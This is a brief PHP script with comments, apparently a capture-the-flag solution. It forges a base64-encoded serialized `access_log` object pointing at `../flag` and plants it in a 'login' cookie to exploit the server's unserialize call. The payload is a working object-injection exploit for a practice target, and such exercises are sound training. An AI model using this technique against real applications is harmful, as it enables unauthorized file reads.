
<?php
//used this writeup for help: https://www.youtube.com/watch?v=Eu3nFVAwAK0
#once in authentication.php, made a cookie named 'login' with the value 'yea' to show the deserialization error
#ran code below in php sandbox to get the value value of the string which serialized the string
print(urlencode(base64_encode(serialize("yea"))))
# ^ delete
#from authentication.phps, knew the code below gives me the cookie value which gives the flag


class access_log
{
	public $log_file = "../flag";
    #problem description says the flag will be in ../file 
}
print(urlencode(base64_encode(serialize(new access_log))))

# cookie.phps shows it's decoded in base64 and then unserialized
# put the value of 'login' cookie too the result of the above code after you run it in php sandbox
?>

